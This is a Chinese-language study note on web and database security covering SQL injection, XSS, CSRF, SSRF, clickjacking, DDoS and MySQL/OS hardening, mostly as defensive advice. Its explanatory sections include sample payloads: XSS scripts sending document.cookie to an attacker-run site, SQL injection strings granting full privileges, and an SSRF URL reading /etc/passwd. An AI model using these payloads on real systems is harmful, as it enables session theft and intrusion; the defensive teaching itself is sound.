# 安全

* 风控:任何系统就算做得再完美，也会出现数据泄露的情况，只是可以把数据泄露的范围控制在一个什么样的比例

## 攻击

* 利用程序框架或库的已知漏洞
* 暴力破解密码。利用密码字典库或是已经泄露的密码来“撞库
* 代码注入。通过程序员代码的安全性问题，如 SQL 注入、XSS 攻击、CSRF 攻击等取得用户的权限
* 利用程序日志不小心泄露的信息
* 社会工程学。RSA 被攻击，第一道防线是人——RSA 的员工。只有员工的安全意识增强了，才能抵御此类攻击。其它的如钓鱼攻击也属于此类

## 数据管理

* 只有一层安全
* 弱密码:最好的方式是通过数据证书、VPN、双因子验证的方式来登录
* 向公网暴露了内部系统
* 对系统及时打安全补丁
* 安全日志被暴露
* 保存了不必要保存的用户数据
* 密码没有被合理地散列,散列一则需要用目前公认安全的算法,二则要加一个安全随机数作为盐（salt）

### 原则

* 永远不要信任用户的输入。对用户的输入进行校验，可以通过正则表达式，或限制长度；对单引号和 双"-"进行转换等
* 永远不要使用动态拼装sql，可以使用参数化的sql或者直接使用存储过程进行数据查询存取
* 永远不要使用管理员权限的数据库连接，为每个应用使用单独的权限有限的数据库连接
* 不要把机密信息直接存放，加密或者hash掉密码和敏感的信息
* 应用的异常信息应该给出尽可能少的提示，最好使用自定义的错误信息对原始错误信息进行包装
* sql注入的检测方法一般采取辅助软件或网站平台来检测，软件一般采用sql注入检测工具jsky，网站平台就有亿思网站安全平台检测工具。MDCSOFT SCAN等。采用MDCSOFT-IPS可以有效的防御SQL注入，XSS攻击等
* 理解你的软件产品中使用了哪些支持性框架和库，它们的版本号分别是多少。时刻跟踪影响这些产品和版本的最新安全性声明。
* 建立一个流程，来快速地部署带有安全补丁的软件产品发布版，这样一旦需要因为安全方面的原因而更新支持性框架或库，就可以快速地发布。最好能在几个小时或几天内完成，而不是几周或几个月。我们发现，绝大多数被攻破的情况是因为几个月或几年都没有更新有漏洞的软件组件而引起的。
  - 以数据库为基础的程序库，设置专门的、初始时全空的测试用数据库来进行 API 级别的测试
  - 对于 UI 框架，使用 UI 自动化测试工具进行自动化测试
  - 测试在原则上必须覆盖上层业务模块所有需要的功能，并对其兼容性加以验证
  - 业务模块要连同程序库一起做集成的自动化测试，同时也要有单元测试
* 所有复杂的软件都有漏洞。不要基于“支持性软件产品没有安全性漏洞”这样的假设来建立安全策略。
* 建立多个安全层。在一个面向公网的表示层（比如 Apache Struts 框架）后面建立多级有安全防护的层次，是一种良好的软件工程实践。就算表示层被攻破，也不会直接提供出重要（或所有）后台信息资源的访问权。
* 针对公网资源，建立对异常访问模式的监控机制。现在有很多侦测这些行为模式的开源和商业化产品，一旦发现异常访问就能发出警报。作为一种良好的运维实践，我们建议针对关键业务的网页服务应用一定要有这些监控机制
* 安全防范最好是做到连自己内部员工都能防，因为无论是程序的 BUG 还是漏洞，都是为了取得系统的权限而获得数据。如果我们能够连内部人都能防的话，那么就可以不用担心绝大多数的系统漏洞了
  - 把关键数据定义出来，然后把这些关键数据隔离出来，隔离到一个安全级别非常高的地方。所谓安全级别非常高的地方，即这个地方需要有各种如安全审计、安全监控、安全访问的区域
  - 在这个区域内，这些敏感数据只入不出。通过提供服务接口来让别的系统只能在这个区域内操作这些数据，而不是把数据传出去，让别的系统在外部来操作这些数据
  - 如果业务必需返回用户的数据，对于像信用卡这样的关键数据是死也不能返回全部数据的，只能返回一个被“马赛克”了的数据（隐藏掉部分信息）。就算需要返回一些数据（如用户的地址），那么也需要在传输层上加密返回
  - 用户加密的算法一定要采用非对称加密的方式，而且还要加上密钥的自动化更换.比如：在外部系统调用 100 次或是第一个小时后就自动更换加密的密钥
  - 这个区域中的数据也是需要加密存放的，而加密使用的密钥则需要放在另外一个区域中,被加密的数据和用于加密的密钥是由不同的人来管理的，有密钥的人没有数据，有数据的人没有密钥，这两拨人可以有访问自己系统的权限，但是没有访问对方系统的权限。这样可以让这两拨人互相审计，互相牵制，从而提高数据的安全性
  - 密钥一定要做到随机生成，最好是对于不同用户的数据有不同的密钥，并且时不时地就能自动化更新一下，这样就可以做到内部防范.用户需要更新密钥时，需要对用户做身份鉴别，可以通过双因子认证，也可以通过更为严格的物理身份验证
  - 每当这些关键信息传到外部系统，需要做通知，最好是通知用户和自己的管理员。并且限制外部系统的数据访问量，超过访问量后，需要报警或是拒绝访问

## MySQL层

* 业务帐号最多只可以通过内网远程登录，而不能通过公网远程连接
* 增加运维平台账号，该账号允许从专用的管理平台服务器远程连接。当然了，要对管理平台部署所在服务器做好安全措施以及必要的安全审计策略。
* 建议启用数据库审计功能。这需要使用MySQL企业版，或者Percona/MariaDB分支版本，MySQL社区版本不支持该功能。
* 启用 safe-update 选项，避免没有 WHERE 条件的全表数据被修改；
* 在应用中尽量不直接DELETE删除数据，而是设置一个标志位就好了。需要真正删除时，交由DBA先备份后再物理删除，避免误操作删除全部数据。
* 还可以采用触发器来做一些辅助功能，比如防止黑客恶意篡改数据。
* MySQL账号权限规则
  - 业务帐号，权限最小化，坚决不允许DROP、TRUNCATE权限。
  - 业务账号默认只授予普通的DML所需权限，也就是select、update、insert、delete、execute等几个权限，其余不给。
  - MySQL初始化后，先行删除无用账号，删除匿名test数据库
  - 创建备份专用账号，只有SELECT权限，且只允许本机可登入。
  - 设置MySQL账号的密码安全策略，包括长度、复杂性。
* 关于数据备份
  - 记住，做好数据全量备份是系统崩溃无法修复时的最后一概救命稻草。
  - 备份数据还可以用来做数据审计或是用于数据仓库的数据源拉取之用。
  - 一般来说，备份策略是这样的：每天一次全备，并且定期对binlog做增备，或者直接利用binlog server机制将binlog传输到其他远程主机上。有了全备+binlog，就可以按需恢复到任何时间点。
  - 特别提醒：当采用xtrabackup的流式备份时，考虑采用加密传输，避免备份数据被恶意截取。
* 操作系统安及应用安全要比数据库自身的安全策略更重要。同理，应用程序及其所在的服务器端的系统安全也很重要，很多数据安全事件，都是通过代码漏洞入侵到应用服务器，再去探测数据库，最后成功拖库。
* 操作系统安全建议
  - 运行MySQL的Linux必须只运行在内部网络，不允许直接对公网暴露，实在有需要从公网连接的话，再通过跳板机做端口转发，并且如上面所述，要严格限制数据库账号权限级别。
  - 系统账号都改成基于ssh key认证，不允许远程密码登入，且ssh key的算法、长度有要求以确保相对安全。这样就没有密码丢失的风险，除非个人的私钥被盗。
  - 进一步的话，甚至可以对全部服务器启用PAM认证，做到账号的统一管理，也更方便、安全。
  - 关闭不必要的系统服务，只开必须的进程，例如 mysqld、sshd、networking、crond、syslogd 等服务，其它的都关闭。
  - 禁止root账号远程登录。
  - 禁止用root账号启动mysqld等普通业务服务进程。
  - sshd服务的端口号建议修改成10000以上。
  - 在不影响性能的前提下，尽可能启用对MySQL服务端口的防火墙策略（高并发时，采用iptables可能影响性能，建议改用ip route策略）。
  - GRUB必须设置密码，物理服务器的Idrac/imm/ilo等账号默认密码也要修改。
  - 每个需要登入系统的员工，都使用每个人私有帐号，而不是使用公共账号。
  - 应该启用系统层的操作审计，记录所有ssh日志，或利bash记录相应的操作命令并发送到远程服务器，然后进行相应的安全审计，及时发现不安全操作。
  - 正确设置MySQL及其他数据库服务相关目录权限，不要全是755，一般750就够了。
  - 可以考虑部署堡垒机，所有连接远程服务器都需要先通过堡垒机，堡垒机上就可以实现所有操作记录以及审计功能了。
  - 脚本加密对安全性提升其实没太大帮助。对有经验的黑客来说，只要有系统登入权限，就可以通过提权等方式轻松获得root。
* 应用安全建议
  - 禁用web server的autoindex配置。
  - 从制度层面，杜绝员工将代码上传到外部github上，因为很可能存在内部IP、账号密码泄露的风险，真的要上传必须先经过安全审核。
  - 尽量不要在公网上使用开源的cms、blog、论坛等系统，除非做过代码安全审计，或者事先做好安全策略。这类系统一般都是黑客重点研究对象，很容易被搞；
  - 在web server层，可以用一些安全模块，比如nginx的WAF模块；
  - 在app server层，可以做好代码安全审计、安全扫描，防止XSS攻击、CSRF攻击、SQL注入、文件上传攻击、绕过cookie检测等安全漏洞；
  - 应用程序中涉及账号密码的地方例如JDBC连接串配置，尽量把明文密码采用加密方式存储，再利用内部私有的解密工具进行反解密后再使用。或者可以让应用程序先用中间账号连接proxy层，再由proxy连接MySQL，避免应用层直连MySQL；

```sh
delete from mysql.user where user!='root' or host!='localhost'; flush privileges;
drop database test;
```

## 加密算法

* AES有很多不同的算法，如aes192，aes-128-ecb，aes-256-cbc等
* AES除了密钥外还可以指定IV（Initial Vector），不同的系统只要IV不同，用相同的密钥加密相同的数据得到的加密结果也是不同的
* 加密结果通常有两种表示方法：hex和base64，这些功能Nodejs全部都支持，但是在应用中要注意，如果加解密双方一方用Nodejs，另一方用Java、PHP等其它语言，需要仔细测试。如果无法正确解密，要确认双方是否遵循同样的AES算法，字符串密钥和IV是否相同，加密后的数据是否统一为hex或base64格式。
* 哈希算法 (Hash Algorithm) :一种从任何一种数据中创建小的数字 “指纹” 的方法。哈希算法将数据重新打乱混合，重新创建一个哈希值.用来保障数据真实性 (即完整性)，即发信人将原始消息和哈希值一起发送，收信人通过相同的哈希函数来校验原始数据是否真实
  - 正像快速：原始数据可以快速计算出哈希值
  - 逆向困难：通过哈希值基本不可能推导出原始数据
  - 输入敏感：原始数据只要有一点变动，得到的哈希值差别很大
  - 冲突避免：很难找到不同的原始数据得到相同的哈希值，宇宙中原子数大约在 10 的 60 次方到 80 次方之间，所以 2 的 256 次方有足够的空间容纳所有的可能，算法好的情况下冲突碰撞的概率很低

## cookie 劫持

通过获取页面的权限，在页面中写一个简单的到恶意站点的请求，并携带用户的 cookie 获取 cookie 后通过 cookie 就可以直以被盗用户的身份登录站点。这就是 cookie 劫持。举个简单例子： 某人写了一篇很有意思的日志，然后分享给大家，很多人都点击查看并且分享了该日志，一切似乎都很正常，然而写日志的人却另有用心，在日志中偷偷隐藏了一个 对站外的请求，那么所有看过这片日志的人都会在不知情的情况下把自己的 cookie 发送给了 某人，那么他可以通过任意一个人的 cookie 来登录这个人的账户。
多窗口浏览器这这方面似乎是有助纣为虐的嫌疑，因为打开的新窗口是具有当前所有 会话的，如果是单浏览器窗口类似 ie6 就不会存在这样的问题，因为每个窗口都是一个独立的进程。举个简单例子 ： 你正在玩白社会， 看到有人发了一个连接，你点击过去，然后这个连接里面伪造了一个送礼物的表单，这仅仅是一个简单的例子，问题可见一般。

## DNS 攻击

## 拒绝服务攻击

* 拒绝服务攻击即攻击者想办法让目标机器停止提供服务
* 攻击者进行拒绝服务攻击，实际上让服务器实现两种效果
  - 一是迫使服务器的缓冲区满，不接收新的请求
  - 二是使用 IP 欺骗，迫使服务器把合法用户的连接复位，影响合法用户的连接

## SQL 注入

* 在 SQL 注入攻击 中，用户通过操纵表单或 GET 查询字符串，将信息添加到数据库查询中。
  - 注入式攻击：添加多余信息
  - 多个查询注入:将终止符插入到查询中即可实现
* 解决方法
  - 检查用户提交的值的类型
  - mysql_real_escape_string()
  - ike查询时，如果用户输入的值有`"_"`和"%"，则会出现这种情况：用户本来只是想查询"abcd_"，查询结果中却有"abcd_"、"abcde"、"abcdf"等等；用户要查询"30%"（注：百分之三十）时也会出现问题。addcslashes()函数在指定的字符前添加反斜杠。
  - PHP的PDO扩展的 prepare 方法
  - 不要使用magic_quotes_gpc指令或它的"幕后搭挡"-addslashes()函数，此函数在应用程序开发中是被限制使用的，并且此函数还要求使用额外的步骤-使用stripslashes()函数。

```sql
SELECT * FROM wines WHERE variety = 'lagrein' OR 1=1;
UPDATE wines SET type='red'，'vintage'='9999' WHERE variety = 'lagrein'  OR 1=1;

SELECT * FROM wines WHERE variety = 'lagrein' ; GRANT ALL ON *.* TO 'BadGuy@%' IDENTIFIED BY 'gotcha';`'`

if (get_magic_quotes_gpc())
{
 $name = stripslashes($name);
}
$name = mysql_real_escape_string($name);
mysql_query("SELECT * FROM users WHERE name='{$name}'");

$sub = addcslashes(mysql_real_escape_string("%something_"), "%_");
```

## [TCP 重置攻击](https://mp.weixin.qq.com/s/crgraQv6qQ-aVJd9L2u1eg)

* 正常情况下，如果客户端收发现到达的报文段对于相关连接而言是不正确的，TCP 就会发送一个重置报文段，从而导致 TCP 连接的快速拆卸
* 在 TCP 重置攻击中，攻击者通过向通信的一方或双方发送伪造的消息，告诉它们立即断开连接，从而使通信双方连接中断
* 一般情况下这种攻击只对长连接有杀伤力

## XSS (Cross Site Script)跨站脚本攻击

* 恶意攻击者往 Web 页面里插入恶意 html 代码，当用户浏览该页之时，嵌入的恶意 html 代码会被执行，从而达到恶意用户的特殊 目的

* XSS 属于被动式的攻击，因为其被动且不好利用，所以许多人常呼略其危害性。但是随着前端技术的不断进步富客户端的应用越来越多，这方面的问题越来 越受关注

* 举个简单例子 ： 假如你现在是 sns 站点上一个用户，发布信息的功能存在漏洞可以执行 js 你在 此刻输入一个 恶意脚本，那么当前所有看到你新信息的人的浏览器都会执行这个脚本弹出提示框 （很爽吧 弹出广告 ：）），如果你做一些更为激进行为呢 后果难以想象。

* 在页面执行你想要的js.理论上，所有可输入的地方没有对输入数据进行处理的话，都会存在XSS漏洞，漏洞的危害取决于攻击代码的威力，攻击代码也不局限于script。

* DOM Based XSS漏洞

  - 获取cookies(对http-only没用)
    + Tom注册了该网站，并且知道了他的邮箱(或者其它能接收信息的联系方式)，我做一个超链接发给他，超链接地址为：http://www.a.com?content=<script>window.open(“www.b.com?param=”+document.cookie)</script>，当Tom点击这个链接的时候(假设他已经登录a.com)，浏览器就会直接打开b.com，并且把Tom在a.com中的cookie信息发送到b.com，b.com是我搭建的网站，当我的网站接收到该信息时，我就盗取了Tom在a.com的cookie信息，cookie信息中可能存有登录密码，攻击成功！

* Stored XSS漏洞

  - a.com可以发文章，我登录后在a.com中发布了一篇文章，文章中包含了恶意代码，<script>window.open(“www.b.com?param=”+document.cookie)</script>，保存文章。这时Tom和Jack看到了我发布的文章，当在查看我的文章时就都中招了，他们的cookie信息都发送到了我的服务器上，攻击成功！

* 控制用户的动作(发帖、私信什么的)

* 解决方案

  - htmlspecialchars函数
  - htmlentities函数
  - HTMLPurifier.auto.php插件
  - RemoveXss函数（百度可以查到）

## 储存用户数据

* 后端不应该以任何明文或可以转换回明文（如可逆的加密）的形式储存密码。由于储存的信息并不是明文，所以大多数网站的「找回密码」功能并不能真的告诉你密码，只能让你重新设置一次。
* MD5哈希:用户注册时，把他的密码做一次MD5运算储存起来；用户登录时，把他输入的密码做一次MD5运算，再验证是否和数据库里储存的一致。
  - 应付不了彩虹表的攻击方式:彩虹表就是把简单的数字密码组合（和各种常见密码）的哈希先尽可能的计算出来，这些明文和哈希结果的对应关系就是一张彩虹表
* 加盐哈希
  - 用户注册时，给他随机生成一段字符串，这段字符串就是盐（Salt）
  - 把用户注册输入的密码和盐拼接在一起，叫做加盐密码
  - 对加盐密码进行哈希，并把结果和盐都储存起来
  - 登陆时，先取出盐，再同样进行拼接、计算哈希，就能判断密码的合法性
* 手机号:只能用相对安全的做法，即先对手机号进行对称加密，再将加密结果储存在数据库里；使用时再用密钥解开。
  - 密钥不应该被保存在数据库里。如果数据库被拖库，那么些数据的安全性与明文无异。通常会将密钥以环境变量的形式放在服务器上。这时除非网站在被拖库的情况下同时被拿到服务器权限

## CSRF (Cross Site Request Forgery)跨站点伪造请求

* 在用户合法的SESSION内发起的攻击。黑客通过在网页中嵌入Web恶意请求代码，并诱使受害者访问该页面，当页面被访问后，请求在受害者不知情的情况下以受害者的合法身份发起，并执行黑客所期待的动作
* *csrf 的攻击不同于 xss csrf 需要被攻击者的主动行为触发。这样听来似乎是有 “被钓鱼” 的嫌疑。

```php
<a href="http://www.shop.com/delProducts.php?id=100" "javascript:return confirm('Are you sure?')">Delete</a>
```

* 常见的比如数据库安全，主要是 SQL 注入，前端 XSS 注入攻击，以及提交请求时 CSRF 攻击  DDoS 攻击、恶意爬取页面如何防护（限制 IP 等）、用户认证/授权安全如何保证（密码、令牌安全等）
* 永远不要相信用户的输入（包括Cookies，因为那也是用户的输入）
* 对用户的口令进行Hash，并使用salt，以防止Rainbow 攻击
  - Hash算法可用MD5或SHA1等
  - 对口令使用salt的意思是，user 在设定密码时，system 产生另外一个random string(salt)。在datbase 存的​​是与salt + passwd 产的md5sum 及salt
  - 当要验证密码时就把user 输入的string 加上使用者的salt，产生md5s​​um 来比对。 理论上用salt 可以大幅度让密码更难破解，相同的密码除非刚好salt 相同，最后​​存在database 上的内容是不一样的。google一下md5+salt你可以看到很多文章
  - 关于Rainbow 攻击，其意思是很像密码字典表，但不同的是，Rainbow Table存的是已经被Hash过的密码了，而且其查找密码的速度更快，这样可以让攻击非常快）。使用慢一点的Hash算法来保存口令，如 bcrypt (被时间检证过了) 或是 scrypt (更强，但是也更新一些) (1, 2)。你可以阅读一下 How To Safely Store A Password（陈皓注：酷壳以前曾介绍过bcrypt这个算法，这里，我更建议我们应该让用户输入比较强的口令，比如Apple ID注册的过程需要用户输入超过8位，需要有大小写和数字的口令，或是做出类似于这样的用户体验的东西）。
* 不要试图自己去发明或创造一个自己的[fancy的认证系统](https://stackoverflow.com/questions/1581610/how-can-i-store-my-users-passwords-safely/1581919#1581919)，可能会忽略到一些不容易让你查觉的东西而导致你的站点被hack了。（陈皓注：我在腾讯那坑爹的申诉系统中说过这个事了，我说过这句话——“真正的安全系统是协同整个社会的安全系统做出来的一道安全长城，而不是什么都要自己搞”，当然，很遗憾不是所有的人都能看懂这个事，包括一些资深的人）
* 了解 [处理信用卡的一些规则](https://www.pcisecuritystandards.org/) . ([这里也有一个问题你可以查看一下](https://stackoverflow.com/questions/51094/payment-processors-what-do-i-need-to-know-if-i-want-to-accept-credit-cards-on)) （有两上vendor可以帮助你，一个是 Authorize.Net 另一个是 PayFlow Pro）
* 使用 SSL/HTTPS 来加密传输登录页面或是任可有敏感信息的页面，比如信用卡号等
* [Session Hijacking](https://en.wikipedia.org/wiki/Session_hijacking)
* 保持系统里所有软件更新到最新的patch
* 确保数据库连接是安全的
* 确保了解最新的攻击技术，以及系统的脆弱处
* XSS 跨站脚本攻击（Cross-Site Scripting）：浏览器错误的将攻击者提供的用户输入数据（表单提交或URL参数）当做JavaScript脚本给执行了
  - 看见输入框就输入：` /><script>alert("xss")</script> ` 进行提交
  - JS 代码被执行后果
    + 偷走用户浏览器里的 Cookie；
    + 通过浏览器的记住密码功能获取到你的站点登录账号和密码；
    + 盗取用户的机密信息；
    + 你的用户在站点上能做到的事情，有了 JS 权限执行权限就都能做，也就是说 A 用户可以模拟成为任何用户；
    + 在网页中嵌入恶意代码；
  - 解决
    + 对数据进行严格的输出编码，使得攻击者提供的数据不再被浏览器认为是脚本而被误执行
    + 编码需要根据输出数据所在的上下文来进行相应的编码，HTML编码 URL编码 JavaScript编码、CSS编码、HTML属性编码、JSON编码
    + 对style、script、image、src、a等等不安全的因素进行过滤或转义(htmlentities htmlspecialchars  strip_tags() 函数来去除 HTML 标签或者使用 htmlentities() 或是 htmlspecialchars())，smarty twig 都会默认为输出加上 htmlentities 防范
    + 将cookie设置成HTTP-only:禁止客户端操作cookie
    + [BeEF](https://beefproject.com/)
* SQL 注入 Injection：通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。 `SELECT * FROM users WHERE username = 'peter' OR '1' = '1'`
  - 解决
    + 转义用户输入的数据 addslashes 和 mysql_real_escape_string 这种转义是不安全的
    + 使用封装好的语句,使用PDO 或 MySQLi 的数据库扩展
    + 工具 [SQLmap](http://sqlmap.org/)
* iframe带来的风险：需要用到第三方提供的页面组件，通常会以iframe的方式引入：添加第三方提供的广告、天气预报、社交分享插件等等。可以在iframe中运行JavaScirpt脚本、Flash插件、弹出对话框等等，这可能会破坏前端用户体验
  - 如果iframe中的域名因为过期而被恶意攻击者抢注，或者第三方被黑客攻破，iframe中的内容被替换掉了，从而利用用户浏览器中的安全漏洞下载安装木马、恶意勒索软件等等
  - 解决
    + 在HTML5中，iframe有了一个叫做sandbox的安全属性，通过它可以对iframe的行为进行各种限制，充分实现“最小权限“原则。使用sandbox的最简单的方式就是只在iframe元素中添加上这个关键词就好 `<iframe sandbox src="..."> ... </iframe>`
    + sandbox还忠实的实现了“Secure By Default”原则，也就是说，如果你只是添加上这个属性而保持属性值为空，那么浏览器将会对iframe实施史上最严厉的调控限制，基本上来讲就是除了允许显示静态资源以外，其他什么都做不了。比如不准提交表单、不准弹窗、不准执行脚本等等，连Origin都会被强制重新分配一个唯一的值，换句话讲就是iframe中的页面访问它自己的服务器都会被算作跨域请求。
    + sandbox也提供了丰富的配置参数，我们可以进行较为细粒度的控制。一些典型的参数如下：
      * allow-forms：允许iframe中提交form表单
      * allow-popups：允许iframe中弹出新的窗口或者标签页（例如，window.open()，showModalDialog()，target=”_blank”等等）
      * allow-scripts：允许iframe中执行JavaScript
      * allow-same-origin：允许iframe中的网页开启同源策略
* ClickJacking（点击劫持）：在通过iframe使用别人提供的内容时，自己的页面也可能正在被不法分子放到他们精心构造的iframe或者frame当中，进行点击劫持攻击，攻击利用了受害者的用户身份，在其不知情的情况下进行一些操作，删除某个重要文件记录，或者窃取敏感信息
  - 步骤
    + 攻击者精心构造一个诱导用户点击的内容，比如Web页面小游戏
    + 将我们的页面放入到iframe当中
    + 利用z-index等CSS样式将这个iframe叠加到小游戏的垂直方向的正上方
    + 把iframe设置为100%透明度
    + 受害者访问到这个页面后，肉眼看到的是一个小游戏，如果受到诱导进行了点击的话，实际上点击到的却是iframe中的我们的页面
  - 解决
    + Frame Breaking方案
    + 使用X-Frame-Options：DENY这个HTTP Header来明确的告知浏览器，不要把当前HTTP响应中的内容在HTML Frame中显示出来
* 错误的内容推断
  - 攻击者在上传图片的时候，看似提交的是个图片文件，实则是个含有JavaScript的脚本文件
  - 后端服务器在返回的响应中设置的Content-Type Header仅仅只是给浏览器提供当前响应内容类型的建议，而浏览器有可能会自作主张的根据响应中的实际内容去推断内容的类型。
  - 解决
    + 通过设置X-Content-Type-Options参数值为nosniff 这个HTTP Header明确禁止浏览器去推断响应类
* SSRF（Server-Side Request Forgery：服务器端请求伪造）：通过注入恶意代码从服务端发起，通过服务端就再访问内网的系统，然后获取不该获取的数据
  - 产生在包含这些方法的代码中，比如 curl、file_get_contents、fsockopen
    + curl 中 `http://www.xxx.com/demo.php?url=file:///etc/passwd`
  - 解决
    + LFI （本地文件包含） 是一个用户未经验证从磁盘读取文件的漏洞 include
    + 对 curl、file_get_contents、fsockopen、这些方法中的参数进行严格验证！
    + 限制协议只能为HTTP或HTTPS，禁止进行跳转。
    + 如果有白名单，解析参数中的URL，判断是否在白名单内。
    + 如果没有白名单，解析参数中的URL，判断是否为内网IP。
* CSRF（Cross-site request forgery：跨站请求伪造）：攻击者通过伪装成受信任的用户，盗用受信任用户的身份，用受信任用户的身份发送恶意请求
  - 解决
    + 服务端生成一个 CSRF 令牌加密安全字符串Token传递给用户，并将 Token 存储于 Cookie 或者 Session 中,在网页构造表单时，将 Token 令牌放在表单中的隐藏字段，表单请求服务器以后会根据用户的 Cookie 或者 Session 里的 Token 令牌比对，校验成功才给予通过
    + 对于不确定是否有csrf风险的请求，可以使用验证码（尽管体验会变差）
    + 对于一些重要的操作（修改密码、修改邮箱），必须使用二次验证
    + 利用HTTP头中的Referer判断请求来源是否合法
* 文件上传：上传了一个可执行的文件到服务器上执行
  - 解决
    + 文件扩展名检测
    + 文件 MIME 验证
    + 文件重命名
    + 文件目录设置不可执行权限
    + 设置单独域名的文件服务器
* HTTPS也可能掉坑里：浏览器发出去第一次请求就被攻击者拦截了下来并做了修改，根本不给浏览器和服务器进行HTTPS通信的机会
  - 用户在浏览器里输入URL的时候往往不是从https://开始的，而是直接从域名开始输入，随后浏览器向服务器发起HTTP通信，然而由于攻击者的存在，它把服务器端返回的跳转到HTTPS页面的响应拦截了，并且代替客户端和服务器端进行后续的通信
  - 解决
    + 使用HSTS（HTTP Strict Transport Security），它通过HTTP Header以及一个预加载的清单，来告知浏览器在和网站进行通信的时候强制性的使用HTTPS，而不是通过明文的HTTP进行通信 `Strict-Transport-Security: max-age=<seconds>; includeSubDomains; preload`
* 信息泄露：敏感数据泄露
  - 本地存储数据泄露:前端存储敏感、机密信息始终都是一件危险的事情，推荐的做法是尽可能不在前端存这些数据
  - 解决
    + 敏感数据脱敏（比如手机号、身份证、邮箱、地址）
    + 服务器上不允许提交包含打印 phpinfo 、$_SERVER 和 调试信息等代码。
    + 定期从开源平台扫描关于企业相关的源码项目
    + 密码加密
      * 哈希（Hash）是将目标文本转换成具有相同长度的、不可逆的杂凑字符串（或叫做消息摘要)
      * 加密（Encrypt）是将目标文本转换成具有不同长度的、可逆的密文
      * 加盐处理避免了两个同样的密码会产生同样哈希的问题， bcrypt
* 中间人攻击：MITM （中间人） 攻击不是针对服务器直接攻击，而是针对用户进行，攻击者作为中间人欺骗服务器他是用户，欺骗用户他是服务器，从而来拦截用户与网站的流量，并从中注入恶意内容或者读取私密信息，通常发生在公共 WiFi 网络中，也有可能发生在其他流量通过的地方，例如ISP运营商。
  - 解决
    + 使用 HTTPS，使用 HTTPS 可以将你的连接加密，并且无法读取或者篡改流量。
    + WEB 服务器配置加上 Strict-Transport-Security 标示头，此头部信息告诉浏览器，你的网站始终通过 HTTPS 访问，如果未通过 HTTPS 将返回错误报告提示浏览器不应显示该页面。 需要到 https://hstspreload.org 注册网站，
* 不安全的第三方依赖包
  - 自动化的工具可以使用，比如NSP(Node Security Platform)，Snyk等等
  - 静态资源完整性校验
    + 每个资源文件都可以有一个SRI值。它由两部分组成，减号（-）左侧是生成SRI值用到的哈希算法名，右侧是经过Base64编码后的该资源文件的Hash值。 <script src=“https://example.js” integrity=“sha384-eivAQsRgJIi2KsTdSnfoEGIRTo25NCAqjNJNZalV63WKX3Y51adIzLT4So1pk5tX”></script>
* DDoS 分布式拒绝服务，Distributed Denial of Service，其原理就是利用大量的请求造成资源过载，导致服务不可用
  - 网络层 DDoS
    + SYN Flood：当攻击方随意构造源 IP 去发送 SYN 包时，服务器返回的 SYN + ACK 就不能得到应答（因为 IP 是随意构造的），此时服务器就会尝试重新发送，并且会有至少 30s 的等待时间，导致资源饱和服务不可用，此攻击属于慢型 DDoS 攻击
    + ACK Flood：在 TCP 连接建立之后，所有的数据传输 TCP 报文都是带有 ACK 标志位的，主机在接收到一个带有 ACK 标志位的数据包的时候，需要检查该数据包所表示的连接四元组是否存在，如果存在则检查该数据包所表示的状态是否合法，然后再向应用层传递该数据包
    + UDP Flood：攻击者可以伪造大量的源 IP 地址去发送 UDP 包，UDP 包双向流量会基本相等，因此发起这种攻击的攻击者在消耗对方资源的时候也在消耗自己的资源。 此种攻击属于大流量攻击
    + ICMP Flood：不断发送不正常的 ICMP 包（所谓不正常就是 ICMP 包内容很大），导致目标带宽被占用，但其本身资源也会被消耗
    + 防御
      * 网络架构上做好优化，采用负载均衡分流。
      * 确保服务器的系统文件是最新的版本，并及时更新系统补丁。
      * 添加抗 DDos 设备，进行流量清洗。
      * 限制同时打开的 SYN 半连接数目，缩短 SYN 半连接的 Timeout 时间。
      * 限制单 IP 请求频率。
      * 防火墙等防护设置禁止 ICMP 包等。
      * 严格限制对外开放的服务器的向外访问。
      * 运行端口映射程序或端口扫描程序，要认真检查特权端口和非特权端口。
      * 关闭不必要的服务。
      * 认真检查网络设备和主机/服务器系统的日志。只要日志出现漏洞或是时间变更,那这台机器就可能遭到了攻击。
      * 限制在防火墙外与网络文件共享。这样会给黑客截取系统文件的机会，主机的信息暴露给黑客，无疑是给了对方入侵的机会。
  - 应用层 DDoS:在网络应用层耗尽你的带宽
    + CC 攻击(Challenge Collapasar):针对消耗资源比较大的页面不断发起不正常的请求，导致资源耗尽
    + DNS Flood 攻击采用的方法是向被攻击的服务器发送大量的域名解析请求，通常请求解析的域名是随机生成或者是网络世界上根本不存在的域名，被攻击的DNS 服务器在接收到域名解析请求的时候首先会在服务器上查找是否有对应的缓存，如果查找不到并且该域名无法直接由服务器解析的时候，DNS 服务器会向其上层 DNS 服务器递归查询域名信息。域名解析的过程给服务器带来了很大的负载，每秒钟域名解析请求超过一定的数量就会造成 DNS 服务器解析域名超时。一台 DNS 服务器所能承受的动态域名查询的上限是每秒钟 9000 个请求
    + HTTP 慢速连接攻击:建立起 HTTP 连接，设置一个较大的 Conetnt-Length，每次只发送很少的字节，让服务器一直以为 HTTP 头部没有传输完成，这样连接一多就很快会出现连接耗尽。
    + 防御
      * 判断 User-Agent 字段（不可靠，因为可以随意构造）
      * 针对 IP + cookie，限制访问频率（由于 cookie 可以更改，IP 可以使用代理，或者肉鸡，也不可靠)
      * 关闭服务器最大连接数等，合理配置中间件，缓解 DDoS 攻击。
      * 请求中添加验证码，比如请求中有数据库操作的时候。
      * 编写代码时，尽量实现优化，并合理使用缓存技术，减少数据库的读取操作。
* 流量劫持
  - DNS 劫持:如果当用户通过某一个域名访问一个站点的时候，被篡改的 DNS 服务器返回的是一个恶意的钓鱼站点的 IP，用户就被劫持到了恶意钓鱼站点
    + 要不就是网络运营商搞的鬼，一般小的网络运营商与黑产勾结会劫持 DNS，要不就是电脑中毒，被恶意篡改了路由器的 DNS 配置
    + 应对
      * 取证很重要，时间、地点、IP、拨号账户、截屏、URL 地址等一定要有。
      * 可以跟劫持区域的电信运营商进行投诉反馈。
      * 如果投诉反馈无效，直接去工信部投诉，一般来说会加白你的域名。
  - HTTP 劫持：当用户访问某个站点的时候会经过运营商网络，而不法运营商和黑产勾结能够截获 HTTP 请求返回内容，并且能够篡改内容，然后再返回给用户，从而实现劫持页面，轻则插入小广告，重则直接篡改成钓鱼网站页面骗用户隐私。
    + 根本原因，是 HTTP 协议没有办法对通信对方的身份进行校验以及对数据完整性进行校验
* 服务器漏洞
  - 越权操作：涉及到数据库的操作都需要先进行严格的验证
